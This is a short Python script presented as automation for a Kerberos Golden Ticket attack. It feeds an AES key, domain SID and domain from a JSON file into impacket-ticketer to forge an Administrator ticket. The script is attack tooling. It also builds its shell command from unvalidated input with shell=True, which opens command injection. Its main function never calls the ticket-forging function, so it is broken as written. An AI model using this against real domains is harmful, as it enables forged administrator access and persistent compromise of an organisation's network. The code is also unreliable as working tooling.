#!/usr/bin/python3

import argparse
import json
from pathlib import Path
import subprocess

def test(test_json):
    subprocess.run(f"impacket-ticketer -aesKey {test_json['aesKey']} -domain-sid {test_json['sid']} -domain {test_json['domain']} -user-id 500 Administrator",shell=True)
    print("[+] GOLDEN TICKET CREATED")


def main():
    parser = argparse.ArgumentParser(description="Automate Golden Ticket Attack")
    parser.add_argument("json_path", type=Path, help="Path to JSON file")
    args = parser.parse_args()

    if not args.json_path.is_file():
        parser.error(f"File not found: {args.json_path}")

    with args.json_path.open("r", encoding="utf-8") as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError as e:
            parser.error(f"Invalid JSON in {args.json_path}: {e}")

if __name__ == "__main__":
    main()